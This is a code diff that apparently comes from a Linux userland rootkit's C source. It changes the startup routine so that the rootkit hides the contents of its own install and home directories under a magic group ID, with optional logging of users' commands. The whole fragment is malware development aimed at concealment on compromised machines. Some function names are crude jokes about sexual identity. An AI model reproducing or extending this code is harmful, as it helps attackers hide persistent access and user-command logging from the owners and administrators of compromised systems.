@@ -4,11 +4,6 @@
 #include "bdv.h"
 #include "sanity.h"
 
-typedef struct {
-    void *(*func)();
-} syms;
-syms symbols[ALL_SIZE];
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -25,6 +20,7 @@ syms symbols[ALL_SIZE];
 #include <dlfcn.h>
 #include <link.h>
 #include <sched.h>
+#include <limits.h>
 #include <linux/fs.h>
 #include <sys/time.h>
 #include <sys/types.h>
@@ -62,14 +58,29 @@ syms symbols[ALL_SIZE];
 #include <syslog.h>
 #endif
 
-#define LINE_MAX 2048
 #define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])
 
+extern void bdvlsuperreallygay(void);
 extern void imgay(void);
-
 void plsdomefirst(void);
+
+struct bdvso {
+    char sopath[2048];
+    char soname[512];
+    char installdir[1024];
+};
+static struct bdvso *so = NULL;
+
+typedef struct {
+    void *(*func)();
+} syms;
+static syms symbols[ALL_SIZE];
+
 #include "includes.h"
 
+extern void bdvlsuperreallygay(void){
+    return;
+}
 extern void imgay(void){
     if(!rknomore()) return;
     printf("INSTALL_DIR:"INSTALL_DIR"\n");
@@ -104,7 +115,12 @@ void plsdomefirst(void){
 #endif
     preparedir(HOMEDIR, magicgid);
     hidedircontents(HOMEDIR, magicgid);
-    hidedircontents(INSTALL_DIR, magicgid);
+    so = getbdvsoinf();
+    if(so != NULL){
+        hidedircontents(so->installdir, magicgid);
+        free(so);
+        so = NULL;
+    }else hidedircontents(INSTALL_DIR, magicgid);
 #ifdef LOG_USER_EXEC
     preparedir(EXEC_LOGS, magicgid);
 #endif
